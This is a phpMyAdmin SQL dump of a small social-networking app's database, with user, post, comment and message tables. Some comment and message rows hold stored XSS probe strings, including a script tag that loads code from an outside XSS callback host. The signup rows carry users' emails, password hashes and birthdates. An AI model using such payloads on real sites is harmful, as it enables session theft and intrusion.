-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 05, 2020 at 01:27 PM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.2.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `Bedebah`
--

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `c_id` bigint(50) NOT NULL,
  `c_author_id` bigint(11) NOT NULL,
  `c_post_id` bigint(11) NOT NULL,
  `c_content` varchar(10000) CHARACTER SET utf8mb4 NOT NULL,
  `c_edited` int(11) NOT NULL DEFAULT 0,
  `c_time_edited` varchar(100) CHARACTER SET utf8mb4 NOT NULL DEFAULT '0',
  `c_time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`c_id`, `c_author_id`, `c_post_id`, `c_content`, `c_edited`, `c_time_edited`, `c_time`) VALUES
(1597103736, 582543175898804, 1597467629, '&lt;script&gt;alert(document.cookies)&lt;/script&gt;', 0, '0', 1592408648);

-- --------------------------------------------------------

--
-- Table structure for table `follow`
--

CREATE TABLE `follow` (
  `id` bigint(11) NOT NULL,
  `uf_one` bigint(11) NOT NULL,
  `uf_two` bigint(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `follow`
--

INSERT INTO `follow` (`id`, `uf_one`, `uf_two`) VALUES
(16, 408763175906156, 582543175898804),
(17, 582543175898804, 289323184808720),
(18, 289323184808720, 582543175898804);

-- --------------------------------------------------------

--
-- Table structure for table `likes`
--

CREATE TABLE `likes` (
  `id` bigint(11) NOT NULL,
  `liker` bigint(11) NOT NULL,
  `post_id` bigint(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `likes`
--

INSERT INTO `likes` (`id`, `liker`, `post_id`) VALUES
(12, 289323184808720, 1597467629);

-- --------------------------------------------------------

--
-- Table structure for table `messages`
--

CREATE TABLE `messages` (
  `id` int(11) NOT NULL,
  `m_id` bigint(11) NOT NULL,
  `message` varchar(1538) CHARACTER SET utf8mb4 NOT NULL,
  `m_from` bigint(11) NOT NULL,
  `m_to` bigint(11) NOT NULL,
  `m_time` int(11) NOT NULL,
  `m_seen` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `messages`
--

INSERT INTO `messages` (`id`, `m_id`, `message`, `m_from`, `m_to`, `m_time`, `m_seen`) VALUES
(7, 1849160666, 'p', 408763175906156, 582543175898804, 1587953294, 1),
(8, 1741732145, 'oi', 582543175898804, 408763175906156, 1587953308, 1),
(9, 1906092321, '😓', 408763175906156, 582543175898804, 1587953322, 1),
(10, 2517053206, 'p', 289323184808720, 582543175898804, 1592404634, 1),
(11, 1973372382, 'oi', 582543175898804, 289323184808720, 1592404671, 1),
(12, 1892883735, '😰', 289323184808720, 582543175898804, 1592404683, 1),
(13, 2589096668, '😈', 289323184808720, 582543175898804, 1592404685, 1),
(14, 2557802612, '👅', 582543175898804, 289323184808720, 1592404693, 1),
(15, 1805534037, '🚬', 289323184808720, 582543175898804, 1592404703, 1),
(16, 1874167122, '💟', 289323184808720, 582543175898804, 1592404726, 1),
(17, 1678158220, '💌', 582543175898804, 289323184808720, 1592404739, 1),
(18, 2378443100, '&lt;script&gt;alert(1)&lt;/script&gt;', 582543175898804, 289323184808720, 1592404760, 1),
(19, 2106987526, 'whatt?', 289323184808720, 582543175898804, 1592404772, 1),
(20, 2494602581, 'hy', 582543175898804, 289323184808720, 1592407806, 1),
(21, 1936703067, 'p', 582543175898804, 289323184808720, 1592407950, 1),
(22, 2040680583, '&lt;script&gt;alert(document.cookies)&lt;/script&gt;', 582543175898804, 289323184808720, 1592408100, 1),
(23, 1627874079, '&lt;script src=//r13.xss.ht&gt;&lt;/script&gt;', 289323184808720, 582543175898804, 1592559300, 1);

-- --------------------------------------------------------

--
-- Table structure for table `mynotepad`
--

CREATE TABLE `mynotepad` (
  `main_id` int(11) NOT NULL,
  `id` bigint(20) NOT NULL,
  `author_id` bigint(11) NOT NULL,
  `note_title` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `note_content` varchar(10000) CHARACTER SET utf8mb4 NOT NULL,
  `note_time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `notifications`
--

CREATE TABLE `notifications` (
  `id` int(11) NOT NULL,
  `n_id` bigint(11) NOT NULL,
  `from_id` bigint(11) NOT NULL,
  `for_id` bigint(11) NOT NULL,
  `notifyType_id` bigint(11) NOT NULL,
  `notifyType` varchar(100) NOT NULL,
  `seen` int(11) NOT NULL DEFAULT 0,
  `time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `notifications`
--

INSERT INTO `notifications` (`id`, `n_id`, `from_id`, `for_id`, `notifyType_id`, `notifyType`, `seen`, `time`) VALUES
(20, 2092152329, 582543175898804, 289323184808720, 582543175898804, 'follow', 1, 1592404422),
(21, 1637061841, 289323184808720, 582543175898804, 289323184808720, 'follow', 1, 1592404623),
(22, 1785741549, 582543175898804, 289323184808720, 1597467629, 'comment', 1, 1592408638),
(23, 1749590982, 582543175898804, 289323184808720, 1597467629, 'comment', 1, 1592408648);

-- --------------------------------------------------------

--
-- Table structure for table `r_star`
--

CREATE TABLE `r_star` (
  `id` bigint(11) NOT NULL,
  `u_id` bigint(11) NOT NULL,
  `p_id` bigint(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `saved`
--

CREATE TABLE `saved` (
  `main_id` int(11) NOT NULL,
  `id` bigint(20) NOT NULL,
  `post_id` bigint(11) NOT NULL,
  `user_saved_id` bigint(11) NOT NULL,
  `saved_time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `signup`
--

CREATE TABLE `signup` (
  `main_id` int(11) NOT NULL,
  `id` bigint(50) NOT NULL,
  `Fullname` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `Username` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `Email` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `Password` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `followers` int(100) NOT NULL DEFAULT 0,
  `Userphoto` varchar(300) CHARACTER SET utf8mb4 NOT NULL,
  `user_cover_photo` varchar(300) CHARACTER SET utf8mb4 DEFAULT NULL,
  `school` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `work` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `work0` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `country` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `birthday` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `verify` int(11) NOT NULL DEFAULT 0,
  `website` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `bio` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `admin` varchar(50) CHARACTER SET utf8mb4 DEFAULT NULL,
  `gender` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `login_attempts` int(11) DEFAULT 0,
  `language` varchar(100) CHARACTER SET utf8mb4 DEFAULT NULL,
  `aSetup` int(11) NOT NULL DEFAULT 0,
  `online` int(100) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `signup`
--

INSERT INTO `signup` (`main_id`, `id`, `Fullname`, `Username`, `Email`, `Password`, `followers`, `Userphoto`, `user_cover_photo`, `school`, `work`, `work0`, `country`, `birthday`, `verify`, `website`, `bio`, `admin`, `gender`, `login_attempts`, `language`, `aSetup`, `online`) VALUES
(14, 582543175898804, 'robbi', 'bii13', 'robbi13@samawatec.com', '$2y$12$xckTkpQRJeS0UGcxP7Aqo.xoIW/uuc5x9xB0RwZtNHMJjtO8zZONG', 2, '15879504101588326943.png', '1587950397859014278.jpg', 'Hacker ', 'univercity', 'oxford', 'Indonesia', '2000/06/13', 0, 'shimozuki.com', '010101', '1', '', 0, 'Indonesia', 100, 0),
(17, 289323184808720, 'ivani', 'ivani95', 'ivani95@gmail.com', '$2y$12$sS1C7CvV8/J89xvU9FFdWu3.XFIiTrk4YMXHJLxHFvwFPqTR0okJW', 1, '15924045501609710611.jpg', '1592404563911305090.jpg', 'Chef', 'univercity', 'oxford', 'Indonesia', '2001/09/05', 0, 'shimozuki.com', '89898989', NULL, 'Male', 0, 'English', 100, 0);

-- --------------------------------------------------------

--
-- Table structure for table `supportbox`
--

CREATE TABLE `supportbox` (
  `id` int(11) NOT NULL,
  `r_id` bigint(11) NOT NULL,
  `from_id` bigint(11) NOT NULL,
  `for_id` bigint(11) NOT NULL,
  `r_type` varchar(100) CHARACTER SET utf8mb4 NOT NULL,
  `subject` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `report` varchar(1000) CHARACTER SET utf8mb4 NOT NULL,
  `r_time` int(11) NOT NULL,
  `r_replay` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `r_replay_time` int(11) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `typing_m`
--

CREATE TABLE `typing_m` (
  `id` bigint(11) NOT NULL,
  `t_from` bigint(11) NOT NULL,
  `t_to` bigint(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `wpost`
--

CREATE TABLE `wpost` (
  `post_id` bigint(50) NOT NULL,
  `author_id` bigint(11) NOT NULL,
  `post_img` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `post_time` int(11) NOT NULL,
  `post_content` mediumtext CHARACTER SET utf8mb4 NOT NULL,
  `p_title` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL,
  `p_likes` int(100) NOT NULL DEFAULT 0,
  `p_privacy` int(11) NOT NULL DEFAULT 0,
  `shared` varchar(1000) CHARACTER SET utf8mb4 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `wpost`
--

INSERT INTO `wpost` (`post_id`, `author_id`, `post_img`, `post_time`, `post_content`, `p_title`, `p_likes`, `p_privacy`, `shared`) VALUES
(1594376476, 582543175898804, NULL, 1592407174, 'aaa', '', 0, 0, NULL),
(1597467629, 289323184808720, 'user_post_img/1592404870284612092.jpeg', 1592404870, 'walpaper krennih', '', 1, 0, NULL),
(1601988938, 582543175898804, NULL, 1592406974, '#bbb', '', 0, 0, NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`c_id`);

--
-- Indexes for table `follow`
--
ALTER TABLE `follow`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `likes`
--
ALTER TABLE `likes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `messages`
--
ALTER TABLE `messages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `mynotepad`
--
ALTER TABLE `mynotepad`
  ADD PRIMARY KEY (`main_id`);

--
-- Indexes for table `notifications`
--
ALTER TABLE `notifications`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `r_star`
--
ALTER TABLE `r_star`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `saved`
--
ALTER TABLE `saved`
  ADD PRIMARY KEY (`main_id`);

--
-- Indexes for table `signup`
--
ALTER TABLE `signup`
  ADD PRIMARY KEY (`main_id`);

--
-- Indexes for table `supportbox`
--
ALTER TABLE `supportbox`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `typing_m`
--
ALTER TABLE `typing_m`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wpost`
--
ALTER TABLE `wpost`
  ADD PRIMARY KEY (`post_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `c_id` bigint(50) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1600747946;

--
-- AUTO_INCREMENT for table `follow`
--
ALTER TABLE `follow`
  MODIFY `id` bigint(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- AUTO_INCREMENT for table `likes`
--
ALTER TABLE `likes`
  MODIFY `id` bigint(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `messages`
--
ALTER TABLE `messages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `mynotepad`
--
ALTER TABLE `mynotepad`
  MODIFY `main_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `notifications`
--
ALTER TABLE `notifications`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `r_star`
--
ALTER TABLE `r_star`
  MODIFY `id` bigint(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `saved`
--
ALTER TABLE `saved`
  MODIFY `main_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `signup`
--
ALTER TABLE `signup`
  MODIFY `main_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `supportbox`
--
ALTER TABLE `supportbox`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=124;

--
-- AUTO_INCREMENT for table `typing_m`
--
ALTER TABLE `typing_m`
  MODIFY `id` bigint(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
